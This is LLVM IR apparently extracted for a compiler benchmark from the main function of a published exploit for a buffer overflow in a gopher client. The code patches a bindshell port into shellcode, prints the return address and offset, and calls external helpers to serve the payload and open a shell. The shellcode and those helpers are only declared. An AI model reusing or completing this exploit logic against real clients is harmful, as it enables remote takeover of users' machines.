; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1187.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1187.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DFL_BINDSHELL_PORT = common dso_local global i16 0, align 2
@.str = private unnamed_addr constant [117 x i8] c"[*] gopher[v3.0.9+]: remote (client) buffer overflow exploit.\0A[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [40 x i8] c"[!] syntax: %s <port> [bindshell port]\0A\00", align 1
@x86_exec = common dso_local global i16* null, align 8
@.str.2 = private unnamed_addr constant [40 x i8] c"[*] replacement \22vi\22 address\09\09: 0x%.8x\0A\00", align 1
@REPLACE_VI_ADDR = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [31 x i8] c"[*] return address\09\09\09: 0x%.8x\0A\00", align 1
@RET_ADDR = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [48 x i8] c"[*] offset from the end of tmpstr[]\09: %d (=%d)\0A\00", align 1
@PLACEMENT_OFFSET = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [25 x i8] c"[*] server port\09\09\09\09: %u\0A\00", align 1
@.str.6 = private unnamed_addr constant [28 x i8] c"[*] bindshell port\09\09\09: %u\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i16, align 2
  %7 = alloca i16, align 2
  %8 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i16 0, i16* %6, align 2
  %9 = load i16, i16* @DFL_BINDSHELL_PORT, align 2
  store i16 %9, i16* %7, align 2
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str, i64 0, i64 0))
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 2
  br i1 %12, label %13, label %19

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 0
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0), i8* %16)
  %18 = call i32 @exit(i32 1) #3
  unreachable

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call zeroext i16 @atoi(i8* %22)
  store i16 %23, i16* %6, align 2
  %24 = load i32, i32* %4, align 4
  %25 = icmp sgt i32 %24, 2
  br i1 %25, label %26, label %31

26:                                               ; preds = %19
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 2
  %29 = load i8*, i8** %28, align 8
  %30 = call zeroext i16 @atoi(i8* %29)
  store i16 %30, i16* %7, align 2
  br label %31

31:                                               ; preds = %26, %19
  %32 = load i16, i16* %7, align 2
  %33 = zext i16 %32 to i32
  %34 = and i32 %33, 65280
  %35 = ashr i32 %34, 8
  %36 = trunc i32 %35 to i16
  %37 = load i16*, i16** @x86_exec, align 8
  %38 = getelementptr inbounds i16, i16* %37, i64 20
  store i16 %36, i16* %38, align 2
  %39 = load i16, i16* %7, align 2
  %40 = zext i16 %39 to i32
  %41 = and i32 %40, 255
  %42 = trunc i32 %41 to i16
  %43 = load i16*, i16** @x86_exec, align 8
  %44 = getelementptr inbounds i16, i16* %43, i64 21
  store i16 %42, i16* %44, align 2
  %45 = load i32, i32* @REPLACE_VI_ADDR, align 4
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.2, i64 0, i64 0), i32 %45)
  %47 = load i32, i32* @RET_ADDR, align 4
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i32 %47)
  %49 = load i32, i32* @PLACEMENT_OFFSET, align 4
  %50 = load i32, i32* @PLACEMENT_OFFSET, align 4
  %51 = mul nsw i32 %50, 4
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.4, i64 0, i64 0), i32 %49, i32 %51)
  %53 = load i16, i16* %6, align 2
  %54 = zext i16 %53 to i32
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i32 %54)
  %56 = load i16, i16* %7, align 2
  %57 = zext i16 %56 to i32
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.6, i64 0, i64 0), i32 %57)
  %59 = load i16, i16* %6, align 2
  %60 = call i8* @gopherd_bind(i16 zeroext %59)
  store i8* %60, i8** %8, align 8
  %61 = call i32 @sleep(i32 3)
  %62 = load i8*, i8** %8, align 8
  %63 = load i16, i16* %7, align 2
  %64 = call i32 @getshell(i8* %62, i16 zeroext %63)
  %65 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local zeroext i16 @atoi(i8*) #1

declare dso_local i8* @gopherd_bind(i16 zeroext) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @getshell(i8*, i16 zeroext) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
